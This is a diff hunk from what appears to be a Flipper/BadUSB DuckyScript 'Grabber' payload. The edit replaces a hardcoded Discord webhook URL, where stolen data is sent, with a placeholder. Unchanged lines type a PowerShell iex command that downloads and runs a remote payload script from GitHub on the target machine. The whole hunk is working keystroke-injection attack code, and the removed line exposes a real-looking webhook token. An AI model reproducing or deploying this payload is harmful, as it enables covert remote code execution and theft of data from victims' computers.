@@ -29,7 +29,7 @@ LEFTARROW
 ENTER
 DELAY 700
 REM edit your webhook here
-STRING $DiscordUrl = 'https://discord.com/api/webhooks/1082421930214297621/5JBlM-QcmSJ4OUWfvqGdBZRZJZ97hNZJouIcN-aV48q_DESZ4HVvXQAf3lzQ9BvEgiW7'
+STRING $DiscordUrl = 'YOUR WEBHOOK HERE'
 ENTER
 STRING iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/carbziesss/Flipper/main/BADKB/Grabber/payload.ps1'))
 ENTER
